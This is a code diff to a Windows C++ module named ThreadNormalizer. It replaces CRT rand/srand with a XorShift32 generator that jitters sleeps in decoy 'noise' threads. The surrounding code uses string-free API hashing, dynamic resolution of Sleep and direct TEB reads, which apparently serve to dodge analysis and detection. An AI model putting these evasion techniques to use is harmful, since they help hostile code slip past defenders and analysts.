@@ -16,6 +16,27 @@
 
 namespace ThreadNormalizer
 {
+    // ═══ XorShift32 PRNG — replaces CRT srand/rand (no /NODEFAULTLIB dependency) ═══
+    static volatile LONG g_PrngState = 0;
+
+    static void PrngSeed(DWORD seed)
+    {
+        if (seed == 0) seed = 0x5A5A5A5A;
+        InterlockedExchange(&g_PrngState, (LONG)seed);
+    }
+
+    static DWORD PrngNext()
+    {
+        LONG state = InterlockedCompareExchange(&g_PrngState, 0, 0);
+        if (state == 0) state = 0x5A5A5A5A;
+        DWORD x = (DWORD)state;
+        x ^= x << 13;
+        x ^= x >> 17;
+        x ^= x << 5;
+        InterlockedExchange(&g_PrngState, (LONG)x);
+        return x;
+    }
+
     // ═══════════════════════════════════════════════════════════════
     //  Pre-computed CRC32C hashes (no string literals in .rdata)
     //
@@ -107,17 +128,17 @@ namespace ThreadNormalizer
         if (InterlockedCompareExchange(&s_SeedInit, 1, 0) == 0)
         {
             // First call: seed with PID/TID combination
-            srand(pid ^ tid ^ 0x5A5A5A5A);
+            PrngSeed(pid ^ tid ^ 0x5A5A5A5A);
         }
 
-        // JitteredSleep: baseMs - (baseMs/8) + rand() % (baseMs/4)
+        // JitteredSleep: baseMs - (baseMs/8) + PrngNext() % (baseMs/4)
         // Range: baseMs * (7/8) to baseMs * (7/8 + 1/4) = baseMs * (9/8)
         // i.e. -12.5% to +12.5%
         DWORD lowerBound = baseMs - (baseMs / 8);
         DWORD jitterRange = baseMs / 4;
         if (jitterRange == 0) jitterRange = 1;
 
-        DWORD jittered = lowerBound + (rand() % jitterRange);
+        DWORD jittered = lowerBound + (PrngNext() % jitterRange);
 
         // Resolve Sleep dynamically
         HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
@@ -353,7 +374,7 @@ namespace ThreadNormalizer
         while (InterlockedCompareExchange(&g_Running, 0, 0) != 0)
         {
             InjectNoise();
-            DWORD delay = 5000 + (rand() % 10000); // 5-15 seconds
+            DWORD delay = 5000 + (PrngNext() % 10000); // 5-15 seconds
             JitteredSleep(delay);
         }
         return 0;
@@ -367,7 +388,7 @@ namespace ThreadNormalizer
         {
             InjectNoise();
             // Simulate I/O completion wait pattern
-            DWORD delay = 5000 + (rand() % 10000);
+            DWORD delay = 5000 + (PrngNext() % 10000);
             JitteredSleep(delay);
         }
         return 0;
@@ -380,7 +401,7 @@ namespace ThreadNormalizer
         while (InterlockedCompareExchange(&g_Running, 0, 0) != 0)
         {
             InjectNoise();
-            DWORD delay = 5000 + (rand() % 10000);
+            DWORD delay = 5000 + (PrngNext() % 10000);
             JitteredSleep(delay);
         }
         return 0;
@@ -398,7 +419,7 @@ namespace ThreadNormalizer
         // Seed rand using PID from TEB
         DWORD pid = (DWORD)__readgsqword(0x40);
         DWORD tid = (DWORD)__readgsqword(0x48);
-        srand(pid ^ tid ^ 0xA5A5A5A5);
+        PrngSeed(pid ^ tid ^ 0x5A5A5A5A);
 
         HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
         if (!hK32) return false;
